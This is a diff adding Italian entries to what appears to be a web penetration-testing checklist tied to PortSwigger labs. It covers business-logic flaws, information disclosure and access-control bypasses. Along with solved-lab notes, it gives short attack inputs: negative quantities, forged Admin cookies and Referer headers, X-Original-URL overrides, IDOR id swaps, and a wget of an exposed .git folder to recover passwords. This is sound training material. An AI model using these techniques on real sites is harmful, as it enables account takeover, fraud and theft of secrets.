+              "process": "Con Burp Proxy modifica i dati dopo l'invio dal browser ma prima dell'elaborazione lato server: i controlli client diventano inutili.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: prezzo modificato nel carrello",
+              "is_lab": true,
+              "process": "Lab risolto modificando la POST che aggiunge l'elemento al carrello, con il campo price ridotto da 10000 a 10.",
+              "payload": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Mancata gestione di input non convenzionali",
+          "description": "Valori che un utente normale non invierebbe: negativi, enormi, tipi inattesi.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Valori fuori range (anche negativi)",
+              "goal": "Rompere limiti numerici della logica.",
+              "tool": null,
+              "payload": "amount=-1000",
+              "process": "Prova numeri enormi, bassissimi o negativi, stringhe lunghe, tipi inattesi. Es. un trasferimento di -1000 supera sempre il controllo 'importo <= saldo' e inverte la direzione.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: azzerare il prezzo con quantita' negativa",
+              "is_lab": true,
+              "process": "Lab risolto modificando la POST di aggiunta al carrello: aggiunto l'item da 1000 e aggiunti -10 item da 10 per azzerare il totale.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Lab: overflow della quantita'",
+              "is_lab": true,
+              "process": "Lab risolto aggiungendo l'item con Intruder impostando la quantita' a 99 (loopback a un numero negativo), poi un altro item per riportare il totale tra 0 e 100 e fare checkout.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Lab: troncamento dell'email a 255 caratteri",
+              "is_lab": true,
+              "process": "Lab risolto: /admin e' riservato alle email @dontwannacry.com e il sito tronca le email a 255 caratteri. Registri stringa_lunga@dontwannacry.com.TUO-DOMINIO facendo finire @dontwannacry.com al 255° carattere: il sistema salva l'email troncata @dontwannacry.com e concede l'accesso ad /admin.",
+              "payload": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Supposizioni errate sul comportamento degli utenti",
+          "description": "Utenti che non restano fidati, omettono parametri o saltano i passaggi.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Gli utenti fidati non restano fidati",
+              "goal": "Sfruttare la fiducia concessa dopo i controlli iniziali.",
+              "tool": null,
+              "payload": null,
+              "process": "Se l'app considera affidabili per sempre utente e dati dopo i controlli iniziali, modifica un dato sensibile (es. l'email del dominio riservato) dopo la registrazione.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: cambio email dopo la registrazione",
+              "is_lab": true,
+              "process": "Lab risolto: con Burp > Discover content trovi /admin (riservato a DontWannaCry). Ti registri con un'email del dominio fornito, confermi, poi in My account cambi l'email in una @dontwannacry.com e accedi ad /admin.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Parametri obbligatori rimossi",
+              "goal": "Raggiungere percorsi di codice saltando input 'obbligatori'.",
+              "tool": null,
+              "payload": null,
+              "process": "Rimuovi un parametro alla volta (sia il nome sia il valore, gestiti spesso diversamente), anche nei processi multi-fase. Vale per URL, POST e anche cookie.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: rimozione di current-password",
+              "is_lab": true,
+              "process": "Lab risolto togliendo il campo current-password e cambiando username ad administrator nella richiesta di cambio password (csrf=...&username=wiener&new-password-1=ciao&new-password-2=ciao).",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Sequenza dei passaggi non rispettata",
+              "goal": "Aggirare workflow multi-step con forced browsing.",
+              "tool": null,
+              "payload": null,
+              "process": "Con il forced browsing invia le richieste in ordine non previsto: salta passaggi, ripetili, torna indietro. Spesso basta una GET/POST a un URL, a volte servono combinazioni di parametri.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: riconferma dell'ordine",
+              "is_lab": true,
+              "process": "Lab risolto: salvata la GET /cart/order-confirmation?order-confirmation=true in Repeater, aggiungi al carrello l'articolo costoso e reinvii la conferma: l'ordine si completa senza che il costo venga detratto dal credito.",
+              "payload": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Difetti specifici del dominio applicativo",
+          "description": "Sconti, prezzi e valori che cambiano in base alle azioni dell'utente.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Manipolare prezzi/sconti",
+              "goal": "Portare l'app in uno stato dove gli aggiustamenti non seguono piu' i criteri previsti.",
+              "tool": null,
+              "payload": null,
+              "process": "Capisci quando e con quale algoritmo vengono applicati sconti/aggiustamenti, poi manipola l'ordine delle azioni per sfruttarli.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: coupon alternati",
+              "is_lab": true,
+              "process": "Lab risolto alternando due codici coupon: lo stesso codice due volte di fila viene rifiutato ('gia' applicato'), ma alternandoli si aggira il controllo e si riduce il totale sotto il credito disponibile.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Lab: ciclo delle gift card",
+              "is_lab": true,
+              "process": "Lab risolto sfruttando un ciclo: coupon SIGNUP30, compri una gift card da $10 pagandola $7, la riscatti per $10 di credito ($3 netti a ciclo). Automatizzato con una macro Burp che estrae il codice gift card dalla risposta e lo riscatta, guidata da Intruder (Null Payloads) fino a generare credito a sufficienza.",
+              "payload": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Encryption oracle e parser email",
+          "description": "Due casi logici particolari.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Encryption oracle",
+              "goal": "Usare una funzione che cifra input utente per forgiare dati cifrati validi.",
+              "tool": null,
+              "payload": null,
+              "process": "Se un input controllabile viene cifrato e il cifrato e' restituito all'utente, e altrove l'app accetta dati cifrati con lo stesso algoritmo, usa l'oracolo per generare input cifrati validi (ancora meglio se esiste anche una funzione di decifratura).",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Discrepanze nel parser degli indirizzi email",
+              "goal": "Registrare account su domini riservati con email ambigue.",
+              "tool": null,
+              "payload": "attacker@TUO-DOMINIO.it(@azienda-riservata.com)   # esempi di encoding/commenti RFC",
+              "process": "Sfrutta il parsing diverso dell'email tra validazione e logica: con encoding mascheri parti dell'indirizzo per superare i controlli ma farlo interpretare come dominio riservato (accesso ad aree sensibili).",
+              "interpretation": null,
+              "references": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Information Disclosure",
+      "description": "Il sito rivela involontariamente dati sensibili, tecnici o di altri utenti.",
+      "intro": "La divulgazione di informazioni e' quando un sito rivela involontariamente: dati di altri utenti, dati aziendali sensibili, o dettagli tecnici su sito e infrastruttura. La gravita' dipende da come un attaccante puo' sfruttarli (sapere la versione di un framework aggiornato vale poco).\n\nPrevenzione: messaggi di errore generici, disabilitare debug/diagnostica in produzione, revisione in QA, consapevolezza di cosa e' sensibile.",
+      "references": "https://portswigger.net/web-security/information-disclosure",
+      "checks": [],
+      "children": [
+        {
+          "name": "Come testare",
+          "description": "Strumenti e tecniche per far emergere informazioni.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Fuzzing dei parametri",
+              "goal": "Provocare comportamenti o errori rivelatori.",
+              "tool": null,
+              "payload": null,
+              "process": "Su parametri interessanti invia tipi di dato inattesi e stringhe di fuzzing (Burp Intruder). L'estensione Logger++ aiuta a filtrare le risposte piu' interessanti.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Burp Scanner ed Engagement tools",
+              "goal": "Trovare rapidamente contenuti e indizi.",
+              "tool": null,
+              "payload": null,
+              "process": "Usa Burp Scanner (Pro) e gli Engagement tools dal menu contestuale: Search (anche regex), Find comments, Discover content (file/dir non linkati).",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Messaggi di errore dettagliati",
+              "goal": "Leggere informazioni dagli errori.",
+              "tool": null,
+              "payload": null,
+              "process": "Presta attenzione a ogni messaggio di errore durante l'auditing: spesso rivela versioni, percorsi, nomi di tabelle/colonne.",
+              "interpretation": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Fonti comuni di divulgazione",
+          "description": "Dove guardare per primo.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "File per i web crawler",
+              "goal": "Scoprire percorsi sensibili elencati per i crawler.",
+              "tool": null,
+              "payload": "/robots.txt\n/sitemap.xml",
+              "process": "Spesso elencano directory che i crawler dovrebbero evitare (quindi interessanti).",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Directory listing",
+              "goal": "Elencare le risorse di un percorso senza pagina index.",
+              "tool": null,
+              "payload": null,
+              "process": "Server mal configurati mostrano il contenuto delle directory prive di index.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Commenti degli sviluppatori",
+              "goal": "Trovare commenti HTML lasciati in produzione.",
+              "tool": null,
+              "payload": null,
+              "process": "Cerca nei commenti del markup (Find comments) percorsi, note o credenziali dimenticate.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Messaggi di errore (fingerprint)",
+              "goal": "Capire lo stack dai dettagli dell'errore.",
+              "tool": null,
+              "payload": "GET /product?productId=a   (tipo di dato inatteso)",
+              "process": "Un tipo di dato inatteso puo' generare uno stack trace che rivela framework e versione.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: versione da stack trace",
+              "is_lab": true,
+              "process": "Lab risolto cambiando GET /product?productId=1 in productId=a: l'errore rivela che gira Apache Struts 2 2.3.31.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Dati di debug",
+              "goal": "Leggere variabili, credenziali, chiavi da log/diagnostica.",
+              "tool": null,
+              "payload": null,
+              "process": "Cerca pagine o file di debug (es. phpinfo) che espongono variabili di sessione, host/credenziali di back-end, chiavi.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: secret key in phpinfo",
+              "is_lab": true,
+              "process": "Lab risolto con fuzzing sull'URL: scopro /cgi-bin con phpinfo, dove trovo la secret key.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "File di backup del codice",
+              "goal": "Leggere il sorgente (e i segreti) da backup temporanei.",
+              "tool": null,
+              "payload": "file.php~\nfile.php.bak",
+              "process": "Editor e tool creano backup (tilde ~ o estensione diversa): richiedere il file col suffisso di backup puo' restituire il sorgente, a volte con chiavi/credenziali.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: directory /backup",
+              "is_lab": true,
+              "process": "Lab risolto trovando la directory /backup dove sono scritte le password.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Configurazioni insicure (metodo TRACE)",
+              "goal": "Sfruttare opzioni di debug lasciate attive.",
+              "tool": null,
+              "payload": "TRACE / HTTP/1.1",
+              "process": "Il metodo TRACE rimanda la richiesta ricevuta: puo' rivelare header di autenticazione interni aggiunti dai reverse proxy.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: header custom via TRACE",
+              "is_lab": true,
+              "process": "Lab risolto: trovo /admin; con TRACE scopro un header custom che permette il login; lo uso sulle GET per /admin e per la delete.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Cronologia del controllo di versione (.git)",
+              "goal": "Recuperare sorgente e segreti dalla cartella .git esposta.",
+              "tool": null,
+              "payload": "/.git/",
+              "process": "Se /.git e' esposta, scaricala tutta e aprila con Git: nei diff dei commit puoi trovare codice e segreti.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: .git esposta",
+              "is_lab": true,
+              "process": "Lab risolto visitando /.git, scaricando tutto (wget -r .../.git/) e leggendo nel diff del commit 'Remove admin password from config' la password in chiaro in admin.conf.",
+              "payload": null,
+              "references": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Access Control",
+      "description": "Aggirare le restrizioni su chi puo' fare cosa o accedere a quali risorse.",
+      "intro": "Il controllo degli accessi decide se un utente e' autorizzato a compiere un'azione; si appoggia ad autenticazione (chi sei) e gestione della sessione (stesse richieste, stesso utente). Tipi: verticale (funzioni per ruoli diversi), orizzontale (risorse di utenti diversi), dipendente dal contesto (ordine dei passaggi).\n\nPrevenzione: mai affidarsi all'offuscamento; negare per default; un meccanismo centralizzato; dichiarare esplicitamente gli accessi consentiti; testare a fondo.",
+      "references": "https://portswigger.net/web-security/access-control",
+      "checks": [],
+      "children": [
+        {
+          "name": "Tipi di controllo degli accessi",
+          "description": "Le tre categorie da tenere a mente.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Verticale, orizzontale, contesto",
+              "goal": "Classificare il controllo per orientare i test.",
+              "tool": null,
+              "payload": null,
+              "process": "Verticale: funzioni riservate a ruoli (admin vs utente). Orizzontale: risorse del singolo utente (i miei conti, non quelli altrui). Contesto: azioni nell'ordine giusto (non modificare il carrello dopo il pagamento).",
+              "interpretation": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Escalation verticale dei privilegi",
+          "description": "Accedere a funzioni per cui non si hanno i permessi.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Funzionalita' admin non protetta",
+              "goal": "Raggiungere pagine amministrative da utente normale.",
+              "tool": null,
+              "payload": "/admin\n/administrator-panel",
+              "process": "Cerca i pannelli admin con fuzzing o robots.txt e prova ad accedervi direttamente.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: pannello admin trovato",
+              "is_lab": true,
+              "process": "Lab risolto trovando il percorso /administrator-panel con fuzzing o robots.txt.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "URL 'nascosto' divulgato nel client",
+              "goal": "Trovare URL admin poco prevedibili ma esposti.",
+              "tool": null,
+              "payload": null,
+              "process": "Un URL come /administrator-panel-yb556 puo' essere nel JavaScript che costruisce la UI in base al ruolo: visibile a tutti nel sorgente.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: URL admin nel sorgente",
+              "is_lab": true,
+              "process": "Lab risolto facendo 'ispeziona sorgente' e trovando il percorso /admin-<codice>.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Controllo basato su parametri",
+              "goal": "Sfruttare ruolo/diritti memorizzati in un valore controllabile.",
+              "tool": null,
+              "payload": "/home.jsp?admin=true\n/home.jsp?role=1\nCookie: Admin=true\n{\"email\":\"...\",\"roleid\":2}",
+              "process": "Se il ruolo e' in un campo nascosto, in un cookie o nella query string, modificalo.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: cookie Admin=true",
+              "is_lab": true,
+              "process": "Lab risolto modificando il cookie da Admin=false a Admin=true nella GET su /admin.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Lab: roleid nella richiesta",
+              "is_lab": true,
+              "process": "Lab risolto aggiungendo alla richiesta di cambio password, oltre all'email, anche il ruolo: {\"email\":\"ciao2@prova.com\",\"roleid\":2}.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Misconfig di piattaforma (override dell'URL)",
+              "goal": "Aggirare controlli front-end legati a URL/metodo.",
+              "tool": null,
+              "payload": "POST / HTTP/1.1\nX-Original-URL: /admin/deleteUser",
+              "process": "Header come X-Original-URL / X-Rewrite-URL sovrascrivono il path: se il front-end filtra per URL ma il back-end onora l'header, bypassi il controllo (i parametri restano nella query string reale).",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: X-Original-URL",
+              "is_lab": true,
+              "process": "Lab risolto: GET / con X-Original-URL: /invalid da' 404 (il back-end usa l'header); cambio in /admin per entrare, e per eliminare carlos uso GET /?username=carlos con X-Original-URL: /admin/delete.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Override del metodo HTTP",
+              "goal": "Eseguire un'azione protetta con un metodo diverso.",
+              "tool": null,
+              "payload": null,
+              "process": "Se il controllo limita URL+metodo ma l'app accetta altri metodi (es. GET al posto di POST), usa il metodo non filtrato.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: POST -> GET",
+              "is_lab": true,
+              "process": "Lab risolto: la promozione di carlos col cookie dell'utente normale da' 'Unauthorized'; cambiando metodo (POSTX -> 'missing parameter', quindi Change request method a GET) e mettendo il proprio username la richiesta passa.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Discrepanze nel matching degli URL",
+              "goal": "Sfruttare differenze di normalizzazione dei percorsi.",
+              "tool": null,
+              "payload": "/ADMIN/DELETEUSER\n/admin/deleteUser.anything   (Spring useSuffixPatternMatch)\n/admin/deleteUser/   (slash finale)",
+              "process": "Se il controllo accessi e' meno tollerante del routing (maiuscole, estensioni, slash finale), raggiungi l'endpoint aggirando la restrizione.",
+              "interpretation": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Escalation orizzontale e IDOR",
+          "description": "Accedere alle risorse di un altro utente.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Cambiare l'identificatore (IDOR)",
+              "goal": "Vedere/gestire risorse di un altro utente cambiando un id.",
+              "tool": null,
+              "payload": "/my-account?id=wiener  ->  /my-account?id=carlos",
+              "process": "Modifica il parametro che identifica la risorsa (id, user...). Gli Insecure Direct Object References sono una sottocategoria del controllo accessi.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: id orizzontale",
+              "is_lab": true,
+              "process": "Lab risolto cambiando nell'URL /my-account?id=wiener in ...?id=carlos.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Identificatori non prevedibili (GUID)",
+              "goal": "Recuperare un GUID altrui divulgato altrove.",
+              "tool": null,
+              "payload": null,
+              "process": "Se l'id e' un GUID, cercalo dove l'app fa riferimento all'utente: post, commenti, recensioni.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: GUID da un post",
+              "is_lab": true,
+              "process": "Lab risolto: trovo un post di carlos, dal link ricavo il suo user id, lo metto nel parametro id della mia pagina account e recupero la sua API key.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Redirect che perde comunque i dati",
+              "goal": "Sfruttare risposte che reindirizzano ma includono dati sensibili.",
+              "tool": null,
+              "payload": null,
+              "process": "Anche se l'app reindirizza al login per accesso non autorizzato, la risposta del redirect puo' contenere ancora i dati della vittima.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: dati nella response del redirect",
+              "is_lab": true,
+              "process": "Lab risolto cambiando id da wiener a carlos: vengo reindirizzato al login ma nella response compare comunque la API key di carlos.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Da orizzontale a verticale",
+              "goal": "Compromettere un utente piu' privilegiato.",
+              "tool": null,
+              "payload": null,
+              "process": "Un'escalation orizzontale verso un admin (es. leggerne/cambiarne la password) diventa verticale.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: password admin in chiaro nella response",
+              "is_lab": true,
+              "process": "Lab risolto cambiando id da wiener a administrator: la password in pagina e' mascherata con ****, ma nella response di Burp si legge in chiaro.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Lab: IDOR su file statico",
+              "is_lab": true,
+              "process": "Lab risolto: nella trascrizione della chat la richiesta porta a /download/txt2; cambiando in /txt1 scarico la chat di carlos con la password.",
+              "payload": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Altri bypass del controllo accessi",
+          "description": "Processi multi-step, header Referer, geolocalizzazione.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Processi multi-step protetti male",
+              "goal": "Saltare i passaggi protetti e inviare solo l'ultimo.",
+              "tool": null,
+              "payload": null,
+              "process": "Se solo alcuni passaggi sono protetti, invia direttamente la richiesta del passaggio finale con i parametri necessari.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: solo l'ultimo step",
+              "is_lab": true,
+              "process": "Lab risolto prendendo l'ultimo step della conferma del passaggio ad admin e rifacendolo con il cookie di wiener.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Controllo basato sull'header Referer",
+              "goal": "Falsificare il Referer per accedere a sottopagine.",
+              "tool": null,
+              "payload": "Referer: https://sito/admin",
+              "process": "Se le sottopagine (es. /admin/deleteUser) controllano solo il Referer, falsificalo con l'URL /admin.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: Referer forgiato",
+              "is_lab": true,
+              "process": "Lab risolto rimandando la richiesta di upgrade con header Referer .../admin: nonostante il cookie di sessione sia di wiener, funziona.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Controllo basato sulla geolocalizzazione",
+              "goal": "Aggirare restrizioni geografiche.",
+              "tool": null,
+              "payload": null,
+              "process": "Usa proxy/VPN o manipola i meccanismi di geolocalizzazione lato client.",
+              "interpretation": null,
+              "references": null
             }
           ]
         }
